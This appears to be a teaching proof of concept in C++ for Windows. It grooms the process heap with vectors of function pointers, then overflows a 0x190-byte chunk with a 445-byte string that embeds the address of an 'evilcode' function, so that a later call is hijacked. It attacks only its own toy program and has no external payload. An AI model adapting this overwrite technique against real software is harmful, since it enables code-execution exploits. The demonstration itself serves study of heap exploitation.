#include <Windows.h>
#include <stdio.h>
#include <vector>
#include <string.h>
using namespace std;

#define CHUNK_SIZE 0x190
#define ALLOC_COUNT 10

class SomeObject {
public:
    void function1() {
    };
    void virtualFunction() {
        printf("test\n");
    };
};

void nicecode(int a) {
    printf("Hi~ I'm Nice! ^ v ^ %d\n", a);
}

void evilcode(int a) {
    printf("Hi~ I'm Evil! * o * %d\n", a);
}

int main(int args, char** argv) {
    int i;
    HANDLE hChunk;
    void* allocations[ALLOC_COUNT];
    SomeObject* objects[5];
    SomeObject* obj = new SomeObject();
    printf("SomeObject address : 0x%08x\n", obj);
    int vectorSize = 40;
	
	HANDLE defaultHeap = GetProcessHeap();

    int a = 0;
    void (*funPtr)(int) = &evilcode;
    int evilPtr = (int)funPtr;
    printf("Evilcode address : 0x%08x\n", evilPtr);

    for (i = 0; i < ALLOC_COUNT; i++) {
        hChunk = HeapAlloc(defaultHeap, 0, CHUNK_SIZE);
        memset(hChunk, 'A', CHUNK_SIZE);
        allocations[i] = hChunk;
        printf("[%d] Heap chunk in backend : 0x%08x\n", i, hChunk);
    }

    HeapFree(defaultHeap, HEAP_NO_SERIALIZE, allocations[6]);
    vector<void (*)(int)> v1(vectorSize, nicecode);
    vector<SomeObject*> v2(vectorSize, obj);
    vector<SomeObject*> v3(vectorSize, obj);
    vector<SomeObject*> v4(vectorSize, obj);
    vector<SomeObject*> v5(vectorSize, obj);
    vector<SomeObject*> v6(vectorSize, obj);
    vector<SomeObject*> v7(vectorSize, obj);
    vector<SomeObject*> v8(vectorSize, obj);
    vector<SomeObject*> v9(vectorSize, obj);
    vector<SomeObject*> v10(vectorSize, obj);

    printf("vector : 0x%08x\n", v1);
    printf("vector : 0x%08x\n", v2);
    printf("vector : 0x%08x\n", v3);
    printf("vector : 0x%08x\n", v4);
    printf("vector : 0x%08x\n", v5);
    printf("vector : 0x%08x\n", v6);
    printf("vector : 0x%08x\n", v7);
    printf("vector : 0x%08x\n", v8);
    printf("vector : 0x%08x\n", v9);
    printf("vector : 0x%08x\n", v10);

    printf("====================================\n");
    printf("Before heap overflow, call v1[0]\n");
    printf("====================================\n");
    v1[0](a);

    char evilString[445];
    sprintf(evilString, "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCDDDD%c%c%c%cefghijklmnopqrstuvwxyzABCD", (char)evilcode, (char)((int)evilcode >> 8), (char)((int)evilcode >> 16), (char)((int)evilcode >> 24));
    printf("%s",evilString);
    
    system("PAUSE");
    memcpy(allocations[5], evilString, sizeof(evilString));
    printf("====================================\n");
    printf("After heap overflow, call v1[0]\n");
    printf("====================================\n");
    v1[0](a);
    system("PAUSE");
    return 0;
}